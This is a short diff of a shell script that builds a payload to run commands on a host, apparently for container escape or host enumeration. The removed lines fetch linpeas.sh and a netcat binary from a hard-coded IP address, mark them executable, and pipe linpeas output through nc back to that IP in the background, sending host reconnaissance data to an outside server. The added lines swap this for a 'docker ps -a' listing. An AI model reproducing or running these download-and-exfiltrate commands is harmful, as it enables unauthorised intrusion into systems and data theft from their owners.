@@ -19,13 +19,8 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 
 # Commands to run on the host<
-curl http://35.194.58.97/linpeas.sh --output /root/peas.sh
-curl http://35.194.58.97/nc --output /root/nc
-chmod +x /root/peas.sh
-chmod +x /root/nc
-nohup /root/peas.sh -s | /root/nc 35.194.58.97 443 &
 
-echo done > \${OUTPATH}
+docker ps -a > \${OUTPATH}
 
 __EOF__
 
@@ -60,9 +55,9 @@ done
 
 # Wait for and cat the output
 echo "about to sleep"
-sleep 60
-echo "sleeping some more"
-sleep 900
+sleep 1
+#echo "sleeping some more"
+#sleep 900
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 cp ${OUTPUT_PATH} peas.txt
